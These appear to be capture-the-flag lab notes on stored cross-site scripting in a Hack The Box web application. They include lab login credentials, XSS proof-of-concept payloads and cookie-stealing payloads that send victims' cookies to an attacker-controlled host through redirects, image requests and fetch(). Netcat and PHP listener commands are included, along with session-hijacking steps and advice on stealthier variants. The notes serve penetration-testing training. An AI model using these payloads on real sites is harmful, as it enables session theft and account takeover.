# Cross-Site Scripting (XSS)

Navigate to `http://xss.htb.net` and log in to the application using the credentials below:

* Email: crazygorilla983
* Password: pisces

This is an account that we created to look at the application's functionality. It looks like we can edit the input fields to update our email, phone number, and country.

<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

In such cases, it is best to use payloads with event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like `onmouseover`.

In one field, let us specify the following payload

```javascript
"><img src=x onerror=prompt(document.domain)>
```

We are using `document.domain` to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment. JavaScript being executed in a sandboxed environment prevents client-side attacks. It should be noted that sandbox escapes exist but are outside the scope of this module.

In the remaining two fields, let us specify the following two payloads.

```javascript
"><img src=x onerror=confirm(1)>
```

```javascript
"><img src=x onerror=alert(1)>
```

We will need to update the profile by pressing "Save" to submit our payloads.

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Let us now check if _HTTPOnly_ is "off" using Web Developer Tools.

<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

## Obtaining session cookies through XSS

This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.

The cookie-logging script can be run as follows. `TUN Adapter IP` is the `tun` interface's IP of either Pwnbox or your own VM.

&#x20; Cross-Site Scripting (XSS)

```shell-session
eldeim@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

### Payload:

Code: javascript

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

**Note**: If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

A sample HTTPS>HTTPS payload example can be found below:

Code: javascript

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

### **Simulate the victim**

Open a `New Private Window`, navigate to `http://xss.htb.net` and log in to the application using the credentials below:

* Email: smallfrog576
* Password: guitars

This account will play the role of the victim!

Now, navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com`. This is the attacker-crafted public profile that hosts our cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).

You should now see the below in your attacking machine.

<figure><img src="../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside `cookieLog.txt`

<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

## Obtaining session cookies via XSS (Netcat edition)

We just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.

```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Let us also instruct Netcat to listen on port 8000 as follows.

```shell-session
eldeim@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Open a `New Private Window` and navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com`, simulating what the victim would do. We remind you that the above is an attacker-controlled public profile hosting a cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).

By the time you hold your mouse over "test," you should now see the below in your attacking machine.

<figure><img src="../../../.gitbook/assets/image (30) (1) (1).png" alt=""><figcaption></figcaption></figure>

Please note that the cookie is a Base64 value because we used the `btoa()` function, which will base64 encode the cookie's value. We can decode it using `atob("b64_string")` in the Dev Console of Web Developer Tools, as follows.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You can now use this stolen cookie to hijack the victim's session!

We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.&#x20;

Find an example of such a payload below.

```javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```
